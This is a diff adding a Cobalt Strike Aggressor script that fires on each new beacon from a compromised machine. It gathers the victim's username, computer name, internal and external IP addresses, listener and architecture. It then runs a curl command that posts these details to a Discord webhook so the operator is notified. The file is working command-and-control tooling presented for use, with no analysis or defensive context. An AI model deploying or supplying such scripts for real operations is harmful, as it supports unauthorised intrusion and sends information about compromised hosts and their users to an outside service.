@@ -1,0 +1,16 @@
+# Based on the work of @sec_groundzero which is based on the work of @bluescreenofjeff
+
+$discord_webhookURL = 'https://discord.com/api/webhooks/*************';
+$teamserver_hostname = 'CobaltParrot';
+
+on beacon_initial {
+        $user = beacon_data($1) ["user"];
+        $arch = beacon_data($1) ["barch"];
+	$computer = beacon_data($1)["computer"];
+	$internal = beacon_data($1)["internal"];
+	$external = beacon_data($1)["external"];
+	$listener = beacon_data($1)["listener"];
+        @curl_command = @('curl','-X','POST','-H','Accept: application/json','-H','Content-Type:application/json','--data','{"content": "Initial Beacon ' . $teamserver_hostname . ', '.$1.' -> '. $user.'@'.$computer.'/'.$internal.'/'.$external.'/'.$listener.'/'.$arch.'"}',$discord_webhookURL);
+        exec(@curl_command);
+}
+
